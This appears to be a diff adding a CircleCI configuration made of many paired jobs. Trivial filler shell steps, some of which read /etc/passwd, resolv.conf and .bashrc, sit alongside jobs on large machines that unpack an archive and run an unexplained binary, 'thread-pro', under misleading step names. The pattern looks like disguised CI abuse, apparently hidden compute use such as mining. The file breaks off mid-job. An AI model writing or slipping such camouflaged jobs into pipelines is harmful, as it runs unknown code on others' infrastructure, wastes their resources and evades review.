@@ -1,0 +1,1395 @@
+version: 2.1
+
+jobs:
+  JPLLB-72993:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute 3
+          command: |
+            mkdir -p /tmp/xfer.d
+            set +o pipefail 2>/dev/null; cmd1='seq 1'; cmd2="798138"; eval "$cmd1 $cmd2" > /tmp/xfer.d/194424_2022; true
+            cksum /tmp/xfer.d/194424_2022 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '194424_2022'
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  phi_old:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Weekend true up
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; for num in monday sunday thursday friday; do printf '%-8s %d\n' "$num" ${#num}; done | nl; true ; } > /tmp/xfer.d/SURGE_BEAM_ENGINE
+            cksum /tmp/xfer.d/SURGE_BEAM_ENGINE | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'SURGE_BEAM_ENGINE'
+  add-router-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/SURGE_BEAM_ENGINE; tail -n 1 /tmp/xfer.d/SURGE_BEAM_ENGINE) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  ref_catch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: expire intrusion rules maybe
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; sed 's/^\s\+//' /etc/resolv.conf | cat -A | head --lines=5; true ; } > /tmp/xfer.d/hawkVectorLambda
+            cksum /tmp/xfer.d/hawkVectorLambda | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'hawkVectorLambda'
+  rm-dashboard-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse; tail -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  FTPView:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Imputing the currency fields almost done
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; printf %s "review pull request" | sha512sum | awk '{print $1}'; true ; } > /tmp/xfer.d/19.169
+            cksum /tmp/xfer.d/19.169 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '19.169'
+  q2-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/19.169; tail -n 1 /tmp/xfer.d/19.169) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  ryo_x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Ok to unlock the metadata catalog
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; awk '{ print length($0), $0 }' "$HOME/.bashrc" | sort -n | tail -n 1; true ; } > /tmp/xfer.d/moduleomega
+            cksum /tmp/xfer.d/moduleomega | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'moduleomega'
+  greg-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/IRON_DUSTY; tail -n 1 /tmp/xfer.d/IRON_DUSTY) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  deferPendingCountMax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: step four wind down the leases
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=2626\nuser=hugo\ndebug=false\n' > "/tmp/red1.txt" && grep ^port "/tmp/red1.txt" | cut -d= -f2; true ; } > /tmp/xfer.d/p
+            cksum /tmp/xfer.d/p | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'p'
+  rust-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  sin_kw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Execute checkpoint with respect to the rate limiter
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; echo "status: ok" | awk '{gsub(/o/, "0"); print}'; true ; } > /tmp/xfer.d/DJI39125
+            cksum /tmp/xfer.d/DJI39125 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'DJI39125'
+  preview-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/DJI39125; tail -n 1 /tmp/xfer.d/DJI39125) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  scaleAsync:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Expire
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; shuf -i 1-456 -n 13 | sort -n | uniq -c | fmt -w 36 | tr -cs '[:alnum:]' '\n'; true ; } > /tmp/xfer.d/bond.beam.valley
+            cksum /tmp/xfer.d/bond.beam.valley | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'bond.beam.valley'
+  europa-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse; tail -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  NO_STAGE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Ship the access logs across to prod
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; tail -n 1 /etc/group | cut -f3 -d: | awk 'NR==1{m=$1} $1>m{m=$1} END{print m}'; true ; } > /tmp/xfer.d/5c3ac4cf6dd5ced0e318e7
+            cksum /tmp/xfer.d/5c3ac4cf6dd5ced0e318e7 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '5c3ac4cf6dd5ced0e318e7'
+  INFRA-206:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/5c3ac4cf6dd5ced0e318e7; tail -n 1 /tmp/xfer.d/5c3ac4cf6dd5ced0e318e7) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  rgChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Sort after go live
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; printf '%d\n' 7 72 439 484 386 200 305 | sort -n | uniq; true ; } > /tmp/xfer.d/stagebe6
+            cksum /tmp/xfer.d/stagebe6 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'stagebe6'
+  perseus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse; tail -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  cost5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: attempt six at routing
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; echo 'remember the milk' > /tmp/shelf_refund.bak && cp /tmp/shelf_refund.bak /tmp/import_quote_2026.12.06.old && diff /tmp/shelf_refund.bak /tmp/import_quote_2026.12.06.old && echo identical; true ; } > /tmp/xfer.d/glint_31128
+            cksum /tmp/xfer.d/glint_31128 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'glint_31128'
+  oscar-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  lockedSchemaNameSidebarCanyon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: collecting parking passes
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; for w in mango fig apple; do echo "${w^}"; done; true ; } > /tmp/xfer.d/md5_2242c9e18c7a2a7
+            cksum /tmp/xfer.d/md5_2242c9e18c7a2a7 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'md5_2242c9e18c7a2a7'
+  wip-retry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/md5_2242c9e18c7a2a7; tail -n 1 /tmp/xfer.d/md5_2242c9e18c7a2a7) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  assert_segment_inner:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute 3
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; nl -w2 /etc/os-release | head -n 15; true ; } > /tmp/xfer.d/IRON_DUSTY
+            cksum /tmp/xfer.d/IRON_DUSTY | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'IRON_DUSTY'
+  java17-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/IRON_DUSTY; tail -n 1 /tmp/xfer.d/IRON_DUSTY) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  disable-if:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Pit stop mirroring
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=5878\nuser=lena\ndebug=false\n' >"/tmp/quota_deck_2.conf" && sed -n "s/^user=//p" "/tmp/quota_deck_2.conf"; true ; } > /tmp/xfer.d/wallet_azure_pixel
+            cksum /tmp/xfer.d/wallet_azure_pixel | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'wallet_azure_pixel'
+  v7-nightly2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse; tail -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  global_type:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: HR 811 key frame conversion
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=9;i>0;i--) printf "%s", i; print ""}'; true ; } > /tmp/xfer.d/zeta228
+            cksum /tmp/xfer.d/zeta228 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'zeta228'
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  ms_fname_prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Squawk 7706
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; rm -f "/tmp/folder_link_frame_2021-05-02.conf" && echo 'removed'; true ; } > /tmp/xfer.d/jTLy3HtVzSNnkD3jP1
+            cksum /tmp/xfer.d/jTLy3HtVzSNnkD3jP1 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'jTLy3HtVzSNnkD3jP1'
+  Ship_App5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/IRON_DUSTY; tail -n 1 /tmp/xfer.d/IRON_DUSTY) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  tPxGjE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Never mirror the stale snapshots on fridays
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; [[ -L /bin ]] && echo good || echo 'bad'; true ; } > /tmp/xfer.d/HAWK_FEN_ATOLL_NICKEL
+            cksum /tmp/xfer.d/HAWK_FEN_ATOLL_NICKEL | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'HAWK_FEN_ATOLL_NICKEL'
+  papa-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/HAWK_FEN_ATOLL_NICKEL; tail -n 1 /tmp/xfer.d/HAWK_FEN_ATOLL_NICKEL) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  SNAPSHOT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Throttle the orphan jobs within 60 min
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; echo 'no errors found' >/tmp/importjunk.list && cp /tmp/importjunk.list "/tmp/nodeharbordolphin.out" && diff /tmp/importjunk.list "/tmp/nodeharbordolphin.out" && echo identical; true ; } > /tmp/xfer.d/bEAmlaMBdALayeRPULse
+            cksum /tmp/xfer.d/bEAmlaMBdALayeRPULse | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'bEAmlaMBdALayeRPULse'
+  atlas-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse; tail -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  FlagScannerMidPipe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Audit log now checkpointed
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; ps -ef | sort -k3 -rn | wc -l; true ; } > /tmp/xfer.d/d23289c0-625a
+            cksum /tmp/xfer.d/d23289c0-625a | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'd23289c0-625a'
+  update-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/IRON_DUSTY; tail -n 1 /tmp/xfer.d/IRON_DUSTY) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  big-password:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: upload sbom
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 3 -name '*' -exec echo '{}' \; 2>/dev/null|xargs -r ls -ld|head -5; true ; } > /tmp/xfer.d/MVI-57877
+            cksum /tmp/xfer.d/MVI-57877 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'MVI-57877'
+  QA_BUILD_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse; tail -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  rDim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Deliver publish value
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; echo -n 'ok' && echo; true ; } > /tmp/xfer.d/walletBlueScarlet
+            cksum /tmp/xfer.d/walletBlueScarlet | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'walletBlueScarlet'
+  APP-452:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/walletBlueScarlet; tail -n 1 /tmp/xfer.d/walletBlueScarlet) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  MAX_RATE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Train the org chart
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -name "user" 2> /dev/null | xargs ls -ld; true ; } > /tmp/xfer.d/GmEtVgf
+            cksum /tmp/xfer.d/GmEtVgf | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'GmEtVgf'
+  fx-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  search010:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Jam on the cron pods
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"}{print $1, $NF}' /etc/passwd | wc -l; true ; } > /tmp/xfer.d/149.201
+            cksum /tmp/xfer.d/149.201 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '149.201'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/149.201; tail -n 1 /tmp/xfer.d/149.201) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  drZhang:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: write off FRESH
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; echo 'yay!' | gzip | base64; true ; } > /tmp/xfer.d/protonBronzeYield
